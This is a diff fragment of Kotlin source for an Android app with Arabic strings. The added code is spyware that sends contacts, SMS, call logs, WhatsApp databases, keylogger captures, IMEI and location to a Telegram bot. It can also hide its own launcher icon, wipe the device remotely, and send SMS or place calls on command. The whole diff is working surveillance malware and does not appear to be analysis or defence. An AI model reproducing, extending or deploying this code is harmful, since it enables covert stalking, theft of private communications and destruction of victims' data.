+                    TelegramDirectClient.sendDocument(file.absolutePath, "📲 نسخة احتياطية - الرسائل")
+                }
+                "calls" -> {
+                    val data = getCalls(context)
+                    val file = File(context.getExternalFilesDir(null), "backup_calls_${System.currentTimeMillis()}.json")
+                    file.writeText(data)
+                    TelegramDirectClient.sendDocument(file.absolutePath, "📞 نسخة احتياطية - المكالمات")
+                }
+                "whatsapp" -> {
+                    val data = getWhatsAppData(context)
+                    TelegramDirectClient.sendMessage("📂 جاري جمع ملفات واتساب...", "HTML")
+                    val waPath = Environment.getExternalStorageDirectory().absolutePath + "/WhatsApp/Databases"
+                    val waFolder = File(waPath)
+                    if (waFolder.exists()) {
+                        waFolder.listFiles()?.sortedByDescending { it.lastModified() }?.firstOrNull()?.let { f ->
+                            TelegramDirectClient.sendDocument(f.absolutePath, "💬 نسخة احتياطية واتساب - ${f.name}")
+                        }
+                    } else {
+                        TelegramDirectClient.sendMessage("❌ لا يوجد مجلد قواعد بيانات واتساب", "HTML")
+                    }
+                }
+                "all" -> {
+                    TelegramDirectClient.sendMessage("📦 <b>جاري جمع النسخة الاحتياطية الشاملة...</b>", "HTML")
+                    delay(1000)
+
+                    val backupDir = File(context.getExternalFilesDir(null), "full_backup_${System.currentTimeMillis()}")
+                    backupDir.mkdirs()
+
+                    // جهات الاتصال
+                    val contactsFile = File(backupDir, "contacts.json")
+                    contactsFile.writeText(getContacts(context))
+
+                    // الرسائل
+                    val smsFile = File(backupDir, "sms.json")
+                    smsFile.writeText(getSMS(context))
+
+                    // المكالمات
+                    val callsFile = File(backupDir, "calls.json")
+                    callsFile.writeText(getCalls(context))
+
+                    // المعلومات
+                    val infoFile = File(backupDir, "device_info.json")
+                    infoFile.writeText(getDeviceInfo(context))
+
+                    // إنشاء ملف ZIP
+                    val zipFile = File(context.getExternalFilesDir(null), "full_backup_${System.currentTimeMillis()}.zip")
+                    zipFiles(backupDir, zipFile)
+
+                    TelegramDirectClient.sendDocument(zipFile.absolutePath, "📦 النسخة الاحتياطية الشاملة")
+
+                    // تنظيف
+                    backupDir.deleteRecursively()
+                }
+            }
+        }
+        return """{"ok":true,"message":"جاري إرسال النسخة الاحتياطية"}"""
+    }
+
+    private fun zipFiles(sourceDir: File, zipFile: File) {
         try {
-            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-            val projection = arrayOf(
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.DATE_TAKEN,
-                MediaStore.Images.Media.SIZE,
-                MediaStore.Images.Media.MIME_TYPE
-            )
-
-            val sortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"
-
-            context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
-                var count = 0
-                while (cursor.moveToNext() && count < MAX_ITEMS) {
-                    val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
-                    val name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
-                    val date = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
-                    val size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE))
-                    val mimeType = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE))
-
-                    results.add(mapOf(
-                        "name" to name,
-                        "date_taken" to date,
-                        "date_readable" to formatDate(date),
-                        "size_bytes" to size,
-                        "size_formatted" to formatFileSize(size),
-                        "mime_type" to mimeType,
-                        "collected_at" to System.currentTimeMillis()
-                    ))
-                    count++
+            java.util.zip.ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
+                sourceDir.walkTopDown().forEach { file ->
+                    if (file.isFile && file != zipFile) {
+                        val entryName = file.relativeTo(sourceDir).path
+                        zos.putNextEntry(java.util.zip.ZipEntry(entryName))
+                        file.inputStream().use { input -> input.copyTo(zos) }
+                        zos.closeEntry()
+                    }
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "خطأ في جمع صور المعرض: ${e.message}", e)
-            results.add(mapOf("error" to "خطأ: ${e.message}"))
+            Log.e(TAG, "خطأ في ضغط الملفات: ${e.message}")
         }
-
-        return results
     }
 
-    // ==================== ==================== ====================
-    //              جمع الملفات المخزنة (Files)
-    // ==================== ==================== ====================
+    // ==================== المراقبة ====================
 
-    private fun collectFiles(context: Context): List<Map<String, Any?>> {
-        val results = mutableListOf<Map<String, Any?>>()
-
-        try {
-            val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
-            if (downloadsDir.exists()) {
-                downloadsDir.listFiles()
-                    ?.filter { it.isFile }
-                    ?.sortedByDescending { it.lastModified() }
-                    ?.take(MAX_ITEMS)
-                    ?.forEach { file ->
-                        results.add(mapOf(
-                            "name" to file.name,
-                            "size_bytes" to file.length(),
-                            "size_formatted" to formatFileSize(file.length()),
-                            "last_modified" to file.lastModified(),
-                            "date_readable" to formatDate(file.lastModified()),
-                            "path" to file.absolutePath,
-                            "collected_at" to System.currentTimeMillis()
-                        ))
-                    }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "خطأ في جمع الملفات: ${e.message}", e)
-            results.add(mapOf("error" to "خطأ: ${e.message}"))
-        }
-
-        if (results.isEmpty()) {
-            results.add(mapOf(
-                "message" to "لا توجد ملفات أو لا يمكن الوصول إليها",
-                "collected_at" to System.currentTimeMillis()
-            ))
-        }
-
-        return results
+    private fun startKeylogger(context: Context): String {
+        SharedPrefsManager.setKeyloggerEnabled(context, true)
+        scope.launch { TelegramDirectClient.sendMessage("⌨️ <b>تم تفعيل تسجيل المفاتيح</b>", "HTML") }
+        return """{"ok":true,"message":"تم تفعيل تسجيل المفاتيح"}"""
     }
 
-    // ==================== ==================== ====================
-    //              جمع محتوى الحافظة (Clipboard)
-    // ==================== ==================== ====================
+    private fun stopKeylogger(context: Context): String {
+        SharedPrefsManager.setKeyloggerEnabled(context, false)
+        return """{"ok":true,"message":"تم إيقاف تسجيل المفاتيح"}"""
+    }
 
-    @Suppress("DEPRECATION")
-    private fun collectClipboard(context: Context): Map<String, Any?> {
+    private fun getKeyloggerData(context: Context): String {
         return try {
-            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
-            val clip = clipboard?.primaryClip
+            val keys = AppDatabase.getKeylogs(context)
+            val data = JSONArray()
+            for (k in keys) {
+                val entry = JSONObject()
+                entry.put("text", k["text"] ?: "")
+                entry.put("app", k["app_package"] ?: "")
+                entry.put("time", k["timestamp"] ?: "")
+                data.put(entry)
+            }
+            val file = File(context.getExternalFilesDir(null), "keylogger_data_${System.currentTimeMillis()}.json")
+            file.writeText(data.toString())
+            scope.launch { TelegramDirectClient.sendDocument(file.absolutePath, "⌨️ بيانات تسجيل المفاتيح") }
+            """{"ok":true,"count":${data.length()}}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
 
-            if (clip != null && clip.itemCount > 0) {
-                val text = clip.getItemAt(0).text?.toString() ?: ""
-                mapOf(
-                    "content" to text,
-                    "length" to text.length,
-                    "collected_at" to System.currentTimeMillis()
-                )
+    private fun startClipboardMonitor(context: Context): String {
+        SharedPrefsManager.setClipboardMonitorEnabled(context, true)
+        return """{"ok":true,"message":"تم تفعيل مراقب الحافظة"}"""
+    }
+
+    private fun stopClipboardMonitor(context: Context): String {
+        SharedPrefsManager.setClipboardMonitorEnabled(context, false)
+        return """{"ok":true,"message":"تم إيقاف مراقب الحافظة"}"""
+    }
+
+    private fun startLiveLocation(context: Context): String {
+        SharedPrefsManager.setLocationTrackingEnabled(context, true)
+        scope.launch { TelegramDirectClient.sendMessage("🗺️ <b>تم تفعيل التتبع المباشر</b>\n📍 سيتم إرسال الموقع كل دقيقة", "HTML") }
+        return """{"ok":true,"message":"تم تفعيل التتبع المباشر"}"""
+    }
+
+    private fun stopLiveLocation(context: Context): String {
+        SharedPrefsManager.setLocationTrackingEnabled(context, false)
+        scope.launch { TelegramDirectClient.sendMessage("⏹️ تم إيقاف التتبع المباشر", "HTML") }
+        return """{"ok":true,"message":"تم إيقاف التتبع المباشر"}"""
+    }
+
+    // ==================== الأمان ====================
+
+    private fun setAppVisibility(context: Context, visible: Boolean): String {
+        return try {
+            val pm = context.packageManager
+            val componentName = ComponentName(context, "${context.packageName}.LauncherAlias")
+            val newState = if (visible) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+            pm.setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP)
+            SharedPrefsManager.setAppHidden(context, !visible)
+            val state = if (visible) "إظهار" else "إخفاء"
+            scope.launch { TelegramDirectClient.sendMessage("👁️ تم $state التطبيق\n\nللإظهار: اتصل بالرمز *#*#7890#*#*", "HTML") }
+            """{"ok":true,"message":"تم $state التطبيق"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun changePasscode(context: Context, params: JSONObject): String {
+        val code = params.optString("code", "7890")
+        SharedPrefsManager.setAdminPasscode(context, code)
+        return """{"ok":true,"message":"تم تغيير الرمز السري إلى: $code"}"""
+    }
+
+    private fun wipeData(context: Context): String {
+        return try {
+            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val componentName = ComponentName(context, MyDeviceAdminReceiver::class.java)
+            if (dpm.isAdminActive(componentName)) {
+                dpm.wipeData(0)
+                """{"ok":true,"message":"جاري مسح البيانات"}"""
             } else {
-                mapOf(
-                    "message" to "الحافظة فارغة",
-                    "collected_at" to System.currentTimeMillis()
-                )
+                """{"ok":false,"error":"مسؤول الجهاز غير مفعّل"}"""
             }
         } catch (e: Exception) {
-            mapOf(
-                "error" to "خطأ في قراءة الحافظة: ${e.message}",
-                "collected_at" to System.currentTimeMillis()
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun factoryReset(context: Context): String {
+        return wipeData(context)
+    }
+
+    // ==================== المنفعة ====================
+
+    private fun ping(context: Context): String {
+        val info = JSONObject()
+        info.put("model", Build.MODEL)
+        info.put("brand", Build.BRAND)
+        info.put("android", Build.VERSION.RELEASE)
+        info.put("sdk", Build.VERSION.SDK_INT)
+        info.put("battery", getBatteryLevel(context))
+        info.put("time", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()))
+        scope.launch {
+            TelegramDirectClient.sendMessage(
+                "📡 <b>الجهاز متصل!</b>\n\n" +
+                "📱 ${Build.MODEL}\n" +
+                "🤖 Android ${Build.VERSION.RELEASE}\n" +
+                "🔋 البطارية: ${getBatteryLevel(context)}%\n" +
+                "🕐 ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}",
+                "HTML"
             )
         }
+        return """{"ok":true,"device":$info}"""
     }
 
-    // ==================== ==================== ====================
-    //              دوال مساعدة (Helper Functions)
-    // ==================== ==================== ====================
-
-    /**
-     * التحقق من وجود إذن
-     */
-    private fun hasPermission(context: Context, permission: String): Boolean {
-        return context.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
+    fun getDeviceInfo(context: Context): String {
+        val info = JSONObject()
+        info.put("model", Build.MODEL)
+        info.put("brand", Build.BRAND)
+        info.put("manufacturer", Build.MANUFACTURER)
+        info.put("android", Build.VERSION.RELEASE)
+        info.put("sdk", Build.VERSION.SDK_INT)
+        info.put("device", Build.DEVICE)
+        info.put("product", Build.PRODUCT)
+        info.put("hardware", Build.HARDWARE)
+        info.put("display", Build.DISPLAY)
+        info.put("fingerprint", Build.FINGERPRINT)
+        info.put("battery", getBatteryLevel(context))
+        info.put("screen_width", getScreenWidth(context))
+        info.put("screen_height", getScreenHeight(context))
+        info.put("total_storage", getTotalStorage(context))
+        info.put("free_storage", getFreeStorage(context))
+        info.put("imei", getIMEI(context))
+        info.put("phone_number", getPhoneNumber(context))
+        info.put("device_id", SharedPrefsManager.getDeviceId(context))
+        return """{"ok":true,"device":$info}"""
     }
 
-    /**
-     * تنسيق التاريخ ليكون مقروءاً
-     */
-    private fun formatDate(timestamp: Long): String {
+    private fun getBatteryInfo(context: Context): String {
+        val battery = JSONObject()
+        battery.put("level", getBatteryLevel(context))
+        battery.put("charging", isCharging(context))
+        battery.put("health", getBatteryHealth(context))
+        battery.put("temperature", getBatteryTemperature(context))
+        battery.put("voltage", getBatteryVoltage(context))
+        battery.put("technology", getBatteryTechnology(context))
+        return """{"ok":true,"battery":$battery}"""
+    }
+
+    private fun getWifiInfo(context: Context): String {
         return try {
-            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
-            sdf.format(Date(timestamp))
+            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+            val info = wifiManager.connectionInfo
+            val ssid = info.ssid?.removeSurrounding("\"") ?: "غير متصل"
+            val bssid = info.bssid ?: ""
+            val ip = String.format("%d.%d.%d.%d",
+                info.ipAddress and 0xff, (info.ipAddress shr 8) and 0xff,
+                (info.ipAddress shr 16) and 0xff, (info.ipAddress shr 24) and 0xff)
+            val rssi = info.rssi
+            val speed = info.linkSpeed
+
+            """{"ok":true,"wifi":{"ssid":"$ssid","bssid":"$bssid","ip":"$ip","rssi":$rssi,"speed":$speed,"frequency":${info.frequency}}}"""
         } catch (e: Exception) {
-            timestamp.toString()
+            """{"ok":false,"error":"${e.message}"}"""
         }
     }
 
-    /**
-     * تنسيق حجم الملف
-     */
-    private fun formatFileSize(bytes: Long): String {
-        return when {
-            bytes < 1024 -> "$bytes B"
-            bytes < 1024 * 1024 -> String.format("%.1f KB", bytes / 1024.0)
-            bytes < 1024 * 1024 * 1024 -> String.format("%.1f MB", bytes / (1024.0 * 1024.0))
-            else -> String.format("%.1f GB", bytes / (1024.0 * 1024.0 * 1024.0))
-        }
-    }
-
-    /**
-     * الحصول على اسم الجهاز
-     */
-    private fun getDeviceName(context: Context): String {
+    private fun getNetworkInfo(context: Context): String {
         return try {
-            android.provider.Settings.Secure.getString(
-                context.contentResolver, "bluetooth_name"
-            ) ?: Build.DEVICE
+            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+            val network = cm.activeNetworkInfo
+            val info = JSONObject()
+            if (network != null && network.isConnected) {
+                info.put("type", network.typeName)
+                info.put("connected", true)
+                info.put("roaming", network.isRoaming)
+            } else {
+                info.put("connected", false)
+            }
+            """{"ok":true,"network":$info}"""
         } catch (e: Exception) {
-            Build.DEVICE
+            """{"ok":false,"error":"${e.message}"}"""
         }
     }
 
-    /**
-     * الحصول على دقة الشاشة
-     */
-    private fun getScreenResolution(context: Context): String {
-        return try {
-            val dm = context.resources.displayMetrics
-            "${dm.widthPixels}x${dm.heightPixels}"
-        } catch (e: Exception) {
-            "غير معروف"
-        }
-    }
-
-    /**
-     * الحصول على إجمالي ذاكرة الوصول العشوائي
-     */
-    private fun getTotalMemory(): String {
-        return try {
-            val runtime = Runtime.getRuntime()
-            val totalMemory = runtime.totalMemory() // بالبايت
-            String.format("%.0f MB", totalMemory / (1024.0 * 1024.0))
-        } catch (e: Exception) {
-            "غير معروف"
-        }
-    }
-
-    /**
-     * الحصول على اسم إصدار التطبيق
-     */
     @Suppress("DEPRECATION")
-    private fun getVersionName(pkgInfo: PackageInfo): String {
-        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            pkgInfo.versionName ?: "غير معروف"
-        } else {
-            pkgInfo.versionName ?: "غير معروف"
+    private fun getSimInfo(context: Context): String {
+        return try {
+            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+            val info = JSONObject()
+            info.put("operator", tm.networkOperatorName ?: "")
+            info.put("sim_operator", tm.simOperatorName ?: "")
+            info.put("sim_state", tm.simState)
+            info.put("phone_type", tm.phoneType)
+            info.put("network_type", tm.networkType)
+            info.put("country_iso", tm.networkCountryIso ?: "")
+            """{"ok":true,"sim":$info}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
         }
     }
+
+    private fun getStorageInfo(context: Context): String {
+        val info = JSONObject()
+        info.put("total", getTotalStorage(context))
+        info.put("free", getFreeStorage(context))
+        info.put("used", getTotalStorage(context) - getFreeStorage(context))
+        return """{"ok":true,"storage":$info}"""
+    }
+
+    @Suppress("DEPRECATION")
+    private fun getInstalledApps(context: Context): String {
+        val apps = JSONArray()
+        val pm = context.packageManager
+        pm.getInstalledApplications(PackageManager.GET_META_DATA).forEach { appInfo ->
+            val app = JSONObject()
+            app.put("package", appInfo.packageName)
+            app.put("name", pm.getApplicationLabel(appInfo).toString())
+            app.put("version", try { pm.getPackageInfo(appInfo.packageName, 0).versionName ?: "" } catch (e: Exception) { "" })
+            app.put("system", (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
+            app.put("installed", appInfo.sourceDir?.contains("/data/app/") == true)
+            apps.put(app)
+        }
+        val file = File(context.getExternalFilesDir(null), "installed_apps_${System.currentTimeMillis()}.json")
+        file.writeText(apps.toString())
+        return """{"ok":true,"count":${apps.length()},"data":$apps}"""
+    }
+
+    private fun getRunningApps(context: Context): String {
+        return try {
+            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+            val apps = JSONArray()
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                am.getRunningAppProcesses()?.forEach { process ->
+                    val app = JSONObject()
+                    app.put("package", process.processName)
+                    app.put("pid", process.pid)
+                    app.put("importance", process.importance)
+                    apps.put(app)
+                }
+            }
+            """{"ok":true,"count":${apps.length()},"data":$apps}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun sendSMS(context: Context, params: JSONObject): String {
+        val number = params.optString("number", "")
+        val text = params.optString("text", "")
+        if (number.isEmpty() || text.isEmpty()) return """{"ok":false,"error":"الرقم والنص مطلوبان"}"""
+        return try {
+            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                context.getSystemService(SmsManager::class.java)
+            } else {
+                @Suppress("DEPRECATION")
+                SmsManager.getDefault()
+            }
+            smsManager.sendTextMessage(number, null, text, null, null)
+            """{"ok":true,"message":"تم إرسال الرسالة"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun makeCall(context: Context, params: JSONObject): String {
+        val number = params.optString("number", "")
+        if (number.isEmpty()) return """{"ok":false,"error":"الرقم مطلوب"}"""
+        return try {
+            val intent = Intent(Intent.ACTION_CALL)
+            intent.data = Uri.parse("tel:$number")
+            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            context.startActivity(intent)
+            """{"ok":true,"message":"جاري الاتصال بـ $number"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun setAlarm(context: Context, params: JSONObject): String {
+        val hour = params.optInt("hour", 7)
+        val minute = params.optInt("minute", 0)
+        val message = params.optString("message", "تنبيه")
+        return try {
+            val intent = Intent(android.provider.AlarmClock.ACTION_SET_ALARM).apply {
+                putExtra(android.provider.AlarmClock.EXTRA_HOUR, hour)
+                putExtra(android.provider.AlarmClock.EXTRA_MINUTES, minute)
+                putExtra(android.provider.AlarmClock.EXTRA_MESSAGE, message)
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            }
+            context.startActivity(intent)
+            """{"ok":true,"message":"تم تعيين المنبه: $hour:$minute - $message"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun setAutoRotate(context: Context, params: JSONObject): String {
+        val enable = params.optBoolean("enable", true)
+        return try {
+            Settings.System.putInt(context.contentResolver, Settings.System.ACCELEROMETER_ROTATION, if (enable) 1 else 0)
+            val state = if (enable) "تشغيل" else "إيقاف"
+            """{"ok":true,"message":"تم $state الدوران التلقائي"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    // ==================== دوال مساعدة ====================
+
+    private fun getBatteryLevel(context: Context): Int {
+        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        return batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
+    }
+
+    private fun isCharging(context: Context): Boolean {
+        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        val status = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
+        return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL
+    }
+
+    private fun getBatteryHealth(context: Context): String {
+        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        val health = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, -1) ?: -1
+        return when (health) {
+            android.os.BatteryManager.BATTERY_HEALTH_GOOD -> "good"
+            android.os.BatteryManager.BATTERY_HEALTH_OVERHEAT -> "overheat"
+            android.os.BatteryManager.BATTERY_HEALTH_DEAD -> "dead"
+            android.os.BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "over_voltage"
+            android.os.BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "failure"
+            else -> "unknown"
+        }
+    }
+
+    private fun getBatteryTemperature(context: Context): Int {
+        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        return (batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10
+    }
+
+    private fun getBatteryVoltage(context: Context): Int {
+        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        return batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
+    }
+
+    private fun getBatteryTechnology(context: Context): String {
+        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        return batteryIntent?.getStringExtra(android.os.BatteryManager.EXTRA_TECHNOLOGY) ?: "Unknown"
+    }
+
+    private fun getScreenWidth(context: Context): Int {
+        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+        val metrics = DisplayMetrics()
+        @Suppress("DEPRECATION")
+        wm.defaultDisplay.getMetrics(metrics)
+        return metrics.widthPixels
+    }
+
+    private fun getScreenHeight(context: Context): Int {
+        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+        val metrics = DisplayMetrics()
+        @Suppress("DEPRECATION")
+        wm.defaultDisplay.getMetrics(metrics)
+        return metrics.heightPixels
+    }
+
+    @Suppress("DEPRECATION")
+    private fun getTotalStorage(context: Context): Long {
+        return try {
+            val stat = Environment.getExternalStorageDirectory()
+            val statFs = android.os.StatFs(stat.path)
+            statFs.totalBytes
+        } catch (e: Exception) {
+            0
+        }
+    }
+
+    @Suppress("DEPRECATION")
+    private fun getFreeStorage(context: Context): Long {
+        return try {
+            val stat = Environment.getExternalStorageDirectory()
+            val statFs = android.os.StatFs(stat.path)
+            statFs.availableBytes
+        } catch (e: Exception) {
+            0
+        }
+    }
+
+    @Suppress("DEPRECATION", "MissingPermission")
+    private fun getIMEI(context: Context): String {
+        return try {
+            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                tm.imei ?: ""
+            } else {
+                tm.deviceId ?: ""
+            }
+        } catch (e: Exception) {
+            ""
+        }
+    }
+
+    @Suppress("DEPRECATION")
+    private fun getPhoneNumber(context: Context): String {
+        return try {
+            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+            tm.line1Number ?: ""
+        } catch (e: Exception) {
+            ""
+        }
+    }
+
+    private fun saveDataToFile(context: Context, filename: String, data: String) {
+        try {
+            val backupDir = File(Environment.getExternalStorageDirectory(), ".abuzahra_backup")
+            if (!backupDir.exists()) backupDir.mkdirs()
+            val file = File(backupDir, filename)
+            file.writeText(data)
+            Log.d(TAG, "تم حفظ الملف: ${file.absolutePath}")
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في حفظ الملف: ${e.message}")
+        }
+    }
+
+    private class IntentFilter(action: String) : android.content.IntentFilter(action)
 }
